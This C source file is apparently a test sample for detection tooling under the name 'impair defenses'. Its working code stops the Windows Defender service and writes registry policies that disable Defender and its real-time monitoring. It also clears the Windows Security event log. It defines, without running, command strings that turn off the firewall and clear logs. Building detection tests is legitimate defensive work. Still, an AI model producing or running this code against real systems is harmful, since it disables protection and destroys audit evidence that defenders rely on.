/*
 * Build: gcc .\test_impair_defenses.c -o test_impair_defenses.exe
 */

#include <windows.h>
#include <stdio.h>

int main()
{
    DWORD r = 0;

    // --- STRINGS ---
    const char *svc_name = "WinDefend";
    const char *proc_name = "MsMpEng.exe";
    const char *reg_val = "DisableAntiSpyware";
    const char *reg_val2 = "DisableRealtimeMonitoring";
    const char *reg_path = "SOFTWARE\\Policies\\Microsoft\\Windows Defender";
    const char *cmd_netsh = "netsh advfirewall set allprofiles state off";
    const char *cmd_wevtutil = "wevtutil cl Security";

    printf("[*] Targeting: %s / %s\n", svc_name, proc_name);
    printf("[*] Registry: %s -> %s\n", reg_path, reg_val);

    // --- COMBINATION 1 : AV/EDR service termination via SCM ---
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    printf("[SCM] handle: %p\n", hSCM);
    if (hSCM)
    {
        SC_HANDLE hSvc = OpenServiceA(hSCM, svc_name, SERVICE_STOP | SERVICE_QUERY_STATUS);
        printf("[SVC] handle: %p\n", hSvc);
        if (hSvc)
        {
            SERVICE_STATUS st;
            BOOL b = ControlService(hSvc, SERVICE_CONTROL_STOP, &st);
            printf("[CTL] stop result: %d\n", b);
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hSCM);
    }

    // --- COMBINATION 2 : Registry-based Defender tampering ---
    HKEY hKey = NULL;
    LONG lRes = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE, reg_path,
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, NULL);
    printf("[REG] create: %ld\n", lRes);
    if (lRes == ERROR_SUCCESS)
    {
        DWORD val = 1;
        lRes = RegSetValueExA(hKey, reg_val, 0, REG_DWORD, (BYTE *)&val, sizeof(val));
        printf("[REG] set DisableAntiSpyware: %ld\n", lRes);
        lRes = RegSetValueExA(hKey, reg_val2, 0, REG_DWORD, (BYTE *)&val, sizeof(val));
        printf("[REG] set DisableRealtimeMonitoring: %ld\n", lRes);
        RegCloseKey(hKey);
    }

    // --- COMBINATION 3 : Event log clearing ---
    HANDLE hLog = OpenEventLogA(NULL, "Security");
    printf("[LOG] handle: %p\n", hLog);
    if (hLog)
    {
        BOOL b = ClearEventLogA(hLog, NULL);
        printf("[LOG] clear: %d\n", b);
        CloseEventLog(hLog);
    }

    // --- COMBINATION 4 : AV/EDR process termination ---
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, GetCurrentProcessId());
    printf("[PROC] handle: %p\n", hProc);

    if (hProc)
        CloseHandle(hProc);
    r = (DWORD)(uintptr_t)TerminateProcess;
    printf("[IAT] TerminateProcess: %p\n", (void *)(uintptr_t)r);

    printf("[*] Done.\n");
    return 0;
}